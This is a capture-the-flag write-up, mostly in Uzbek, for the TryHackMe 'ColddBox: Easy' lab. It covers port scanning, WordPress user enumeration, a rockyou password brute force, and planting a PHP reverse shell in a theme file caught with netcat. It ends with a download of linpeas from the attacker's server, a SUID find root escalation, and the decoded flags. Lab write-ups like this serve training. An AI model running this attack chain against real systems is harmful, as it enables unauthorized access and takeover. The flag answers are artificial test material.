# ColddBox: Easy

Room: https://tryhackme.com/room/colddboxeasy

## Razvetka

```

╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.177.241 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.177.241:80
Open 10.10.177.241:4512
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.177.241
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 01:30 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 01:30
Scanning 10.10.177.241 [2 ports]
Completed Ping Scan at 01:30, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:30
Completed Parallel DNS resolution of 1 host. at 01:30, 4.00s elapsed
DNS resolution of 1 IPs took 4.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 01:30
Scanning 10.10.177.241 [2 ports]
Discovered open port 80/tcp on 10.10.177.241
Discovered open port 4512/tcp on 10.10.177.241
Completed Connect Scan at 01:30, 0.20s elapsed (2 total ports)
Initiating Service scan at 01:30
Scanning 2 services on 10.10.177.241
Completed Service scan at 01:30, 6.67s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.177.241.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.93s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:30
Completed NSE at 01:30, 0.85s elapsed
Nmap scan report for 10.10.177.241
Host is up, received syn-ack (0.22s latency).
Scanned at 2025-06-16 01:30:24 +05 for 8s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

80 portda nima ishlayapti?

```
╭─mete   󰉖 ~
╰─ ❯❯ whatweb http://10.10.177.241/
http://10.10.177.241/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.177.241], JQuery[1.11.1], MetaGenerator[WordPress 4.1.31], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[ColddBox | One more machine], WordPress[4.1.31], x-pingback[/xmlrpc.php]
```

WPscan bo'yicha izlanish olib borishimiz kerak.

Buyruq:

```
wpscan --url http://10.10.109.191/ -e vp,vt,u  
```

Tushuntirish:

**-- url** ---- bu nishonni belgilash.

-e --- enumerate qilish uchun beglilash.

- vp -- zaif plaginlar
- vt -- zaif temalar
- u -- foydalanuvchilar


Natija:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.109.191/ [10.10.109.191]
[+] Started: Wed Jun 18 14:58:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.109.191/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.109.191/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.109.191/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.109.191/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.109.191/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.109.191/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.109.191/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://10.10.109.191/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.109.191/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <=============================================================================================================> (652 / 652) 100.00% Time: 00:00:17
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jun 18 14:59:21 2025
[+] Requests Done: 681
[+] Cached Requests: 40
[+] Data Sent: 178.226 KB
[+] Data Received: 134.307 KB
[+] Memory used: 249.695 MB
[+] Elapsed time: 00:00:23
```

## Web Hacking | Brute Force

Foydalanuvchilar:

1. hugo
2. c0ldd
3. philip

Bu foydaluvchilardan users.txt tuzamiz va "Dictionary attack"ni boshlaymiz.

Buyruq:

```\
wpscan --url http://10.10.109.191/ --usernames user.txt --passwords /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Natijalar:

```
c0ldd / 9876543210    
```

Kirish uchun link:

```
http://10.10.109.191/wp-login.php
```

Kirgach esa tizim fayllarini o'zgartirib reverse shell joylaymiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/colddboxeasy_1.jpg)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/colddboxeasy_2.jpg)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/colddboxeasy_3.jpg)

Reverse shellni joylab "Update FIle" tugmasini bosamiz va o'zgartirgan faylimizga so'rov yuboramiz.

Reverse shell: https://github.com/akhatkulov/HackBox/blob/main/reverse-shell.php

Xabar yuborish uchun link: http://10.10.109.191/wp-content/themes/twentyfifteen/404.php

Natija:

```

╭─mete    ~
╰─ ❯❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.109.191 54858
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:23:17 up 35 min,  0 users,  load average: 1.33, 0.82, 0.48
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$

```

## Privilage Escalation

Tizimga kirib oldik endi esa imtiyozlarni oshirish kerak.

Tizimni tahlil qilish uchun bizga linpeas.sh dasturi kerak bo'ladi. Uni kompyuterimga yuklab, serverga olib o'tishimiz kerak.

Uni yuklab olish:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Kompyuterimizga yuklab olgach biz o'zimizdan HTTP server ochib faylni serverga olib o'tamiz.

Http server ochish:

```
sudo python3 -m http.server 80
```

Serverga yuklash:

```
wget 10.8.24.135/linpeas.sh
```

Unga Execution huquqini berish:

```
chmod +x linpeas.sh
```

Ishga tushurish:

```
./linpeas.sh 
```

 Meni qiziqtirgan hisobot qismi:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/colddboxeasy_4.jpg)

/usr/bin/find dasturidan eskalatsiya uchun foydalansak bo'lar ekan.

Buni qanday qilishni bu yerdan o'rganishingiz mumkin.

Link: https://gtfobins.github.io/gtfobins/find/#suid

Jarayon:

```
www-data@ColddBox-Easy:/var/www/html/hidden$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
#

```

**user.txt**'ni qo'lga kiritish:

```
# whoami
whoami
root
# cd /home
cd /home
# ls
ls
c0ldd
# cd c0ldd
cd c0ldd
# ls
ls
user.txt
# cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

```

```
# cat user.txt | base64 -d
Felicidades, primer nivel conseguido!#
```

**root.txt**'ni qo'lga kiritish:

```
# cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

```

```
# cat root.txt | base64 -d
cat root.txt | base64 -d
¡Felicidades, máquina completada!#

```



# Nafas olar ekanman, men yana davom etaman...
